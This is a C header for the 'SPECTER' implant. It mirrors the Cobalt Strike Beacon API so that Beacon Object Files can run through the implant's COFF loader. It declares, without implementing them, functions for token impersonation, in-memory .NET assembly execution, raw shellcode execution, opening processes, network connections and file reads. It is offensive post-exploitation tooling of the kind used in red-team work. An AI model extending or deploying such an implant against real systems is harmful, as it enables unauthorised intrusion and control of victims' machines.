/**
 * SPECTER Implant — Cobalt Strike Beacon API Compatibility Header
 *
 * Defines the datap/formatp structures and function prototypes that
 * mirror the Cobalt Strike Beacon API.  BOFs compiled against the
 * standard beacon.h can be loaded directly by SPECTER's COFF loader;
 * each function is shimmed to the MODULE_BUS_API at runtime.
 */

#ifndef BEACON_H
#define BEACON_H

#include "specter.h"
#include "bus.h"

/* ------------------------------------------------------------------ */
/*  Beacon output callback types (Cobalt Strike conventions)           */
/* ------------------------------------------------------------------ */

#define CALLBACK_OUTPUT         0x00   /* Normal text output            */
#define CALLBACK_OUTPUT_OEM     0x1e   /* OEM-encoded output            */
#define CALLBACK_ERROR          0x0d   /* Error output                  */

/* ------------------------------------------------------------------ */
/*  datap — Beacon data parser for BOF arguments                       */
/* ------------------------------------------------------------------ */

typedef struct {
    char   *original;    /* Pointer to original buffer start             */
    char   *buffer;      /* Current read position                        */
    int     length;      /* Total buffer length                          */
    int     size;        /* Remaining bytes from current position        */
} datap;

/* ------------------------------------------------------------------ */
/*  formatp — Beacon format buffer for building output                 */
/* ------------------------------------------------------------------ */

#define BEACON_FORMAT_ALLOC_MAX  4096  /* Max format buffer allocation  */

typedef struct {
    char   *original;    /* Allocated buffer start                       */
    char   *buffer;      /* Current write position                       */
    int     length;      /* Bytes written so far                         */
    int     size;        /* Total allocated capacity                     */
} formatp;

/* ------------------------------------------------------------------ */
/*  Beacon API function prototypes                                     */
/* ------------------------------------------------------------------ */

/* --- Output functions --- */

/**
 * BeaconOutput — send raw output to the operator console.
 * type: CALLBACK_OUTPUT, CALLBACK_OUTPUT_OEM, or CALLBACK_ERROR
 * data: output buffer
 * len:  output length
 */
void BeaconOutput(int type, const char *data, int len);

/**
 * BeaconPrintf — formatted output (printf-style) to operator console.
 * type: CALLBACK_OUTPUT or CALLBACK_ERROR
 * fmt:  printf-style format string (supports %s, %d, %u, %x, %p, %c, %%)
 */
void BeaconPrintf(int type, const char *fmt, ...);

/* --- Data parser functions (argument unpacking) --- */

/**
 * BeaconDataParse — initialize a data parser over a BOF argument blob.
 */
void BeaconDataParse(datap *parser, char *buffer, int size);

/**
 * BeaconDataInt — extract a 4-byte big-endian integer from the parser.
 */
int BeaconDataInt(datap *parser);

/**
 * BeaconDataShort — extract a 2-byte big-endian short from the parser.
 */
short BeaconDataShort(datap *parser);

/**
 * BeaconDataLength — return the number of remaining bytes in the parser.
 */
int BeaconDataLength(datap *parser);

/**
 * BeaconDataExtract — extract a length-prefixed byte buffer.
 * out_len: receives the extracted length (may be NULL).
 * Returns pointer into the parser buffer (not a copy).
 */
char *BeaconDataExtract(datap *parser, int *out_len);

/* --- Format buffer functions (output building) --- */

/**
 * BeaconFormatAlloc — allocate a format buffer via bus memory.
 */
void BeaconFormatAlloc(formatp *format, int maxsz);

/**
 * BeaconFormatReset — reset buffer position without freeing.
 */
void BeaconFormatReset(formatp *format);

/**
 * BeaconFormatAppend — append raw bytes to the format buffer.
 */
void BeaconFormatAppend(formatp *format, const char *data, int len);

/**
 * BeaconFormatPrintf — append printf-formatted text to the buffer.
 */
void BeaconFormatPrintf(formatp *format, const char *fmt, ...);

/**
 * BeaconFormatToString — return a pointer to the buffer content.
 * out_len: receives the current length.
 */
char *BeaconFormatToString(formatp *format, int *out_len);

/**
 * BeaconFormatFree — release the format buffer memory.
 */
void BeaconFormatFree(formatp *format);

/**
 * BeaconFormatInt — append a 4-byte big-endian integer.
 */
void BeaconFormatInt(formatp *format, int value);

/* --- Token functions --- */

/**
 * BeaconUseToken — impersonate a token handle.
 */
BOOL BeaconUseToken(HANDLE token);

/**
 * BeaconRevertToken — revert to the implant's original token.
 */
void BeaconRevertToken(void);

/* --- Utility functions --- */

/**
 * BeaconIsAdmin — check if the current process has admin privileges.
 * Returns TRUE if elevated, FALSE otherwise.
 */
BOOL BeaconIsAdmin(void);

/**
 * BeaconGetSpawnTo — get the configured spawn-to process path.
 * x86:  if TRUE, return the x86 spawn-to path; otherwise x64.
 * len:  receives the path length.
 * Returns pointer to the path string.
 */
char *BeaconGetSpawnTo(BOOL x86, int *len);

/**
 * toWideChar — convert a UTF-8 string to UTF-16LE in-place or via buffer.
 * src:  source UTF-8 string
 * dst:  destination buffer for UTF-16LE
 * max:  maximum number of wide characters (including null)
 * Returns number of wide characters written.
 */
int toWideChar(const char *src, WCHAR *dst, int max);

/* ------------------------------------------------------------------ */
/*  SPECTER extended BOF API (opt-in, SPECTER_* prefix)                */
/* ------------------------------------------------------------------ */

/**
 * SPECTER_MemAlloc — allocate memory via bus API.
 * size: allocation size in bytes
 * Returns pointer to allocated memory, or NULL on failure.
 */
PVOID SPECTER_MemAlloc(SIZE_T size);

/**
 * SPECTER_Resolve — resolve a DLL export via bus API.
 * dll_name: DLL name (e.g., "kernel32.dll")
 * func_name: export name (e.g., "CreateFileW")
 * Returns function pointer, or NULL if not found.
 */
PVOID SPECTER_Resolve(const char *dll_name, const char *func_name);

/**
 * SPECTER_NetConnect — establish a network connection via bus API.
 * addr: target address string
 * port: target port
 * Returns connection handle, or INVALID_HANDLE_VALUE on failure.
 */
HANDLE SPECTER_NetConnect(const char *addr, DWORD port);

/**
 * SPECTER_ProcOpen — open a process by PID via bus API.
 * pid: target process ID
 * access: desired access rights
 * Returns process handle, or INVALID_HANDLE_VALUE on failure.
 */
HANDLE SPECTER_ProcOpen(DWORD pid, DWORD access);

/**
 * SPECTER_FileRead — read a file into a buffer via bus API.
 * path: file path
 * buf: destination buffer
 * len: buffer capacity
 * Returns bytes read, or 0 on failure.
 */
DWORD SPECTER_FileRead(const char *path, BYTE *buf, DWORD len);

/* ------------------------------------------------------------------ */
/*  CLR hosting API                                                    */
/* ------------------------------------------------------------------ */

/**
 * clr_execute_assembly — load and execute a .NET assembly from memory.
 * api: module bus API pointer
 * assembly_bytes: raw assembly byte array
 * len: assembly length
 * args: command-line arguments string (may be NULL)
 * Returns 0 on success, non-zero on failure.
 */
DWORD clr_execute_assembly(MODULE_BUS_API *api, const BYTE *assembly_bytes,
                           DWORD len, const char *args);

/* ------------------------------------------------------------------ */
/*  Inline shellcode execution API                                     */
/* ------------------------------------------------------------------ */

/**
 * exec_shellcode — allocate, copy, and execute raw shellcode.
 * api: module bus API pointer
 * code: shellcode bytes
 * len: shellcode length
 * Returns 0 on success, non-zero on failure.
 */
DWORD exec_shellcode(MODULE_BUS_API *api, const BYTE *code, DWORD len);

/* ------------------------------------------------------------------ */
/*  Beacon API symbol table entry (for COFF loader resolution)         */
/* ------------------------------------------------------------------ */

typedef struct _BEACON_API_ENTRY {
    const char *name;       /* Symbol name (e.g., "BeaconOutput")      */
    PVOID       address;    /* Shim function address                   */
} BEACON_API_ENTRY;

/**
 * Initialize the beacon shim layer with a MODULE_BUS_API pointer.
 * Must be called before loading a BOF that uses Beacon API functions.
 */
void beacon_shim_init(MODULE_BUS_API *api);

/**
 * Get the Beacon API symbol table for COFF loader symbol resolution.
 * count_out: receives the number of entries in the table.
 * Returns pointer to the static symbol table array.
 */
BEACON_API_ENTRY *beacon_shim_get_table(DWORD *count_out);

#endif /* BEACON_H */
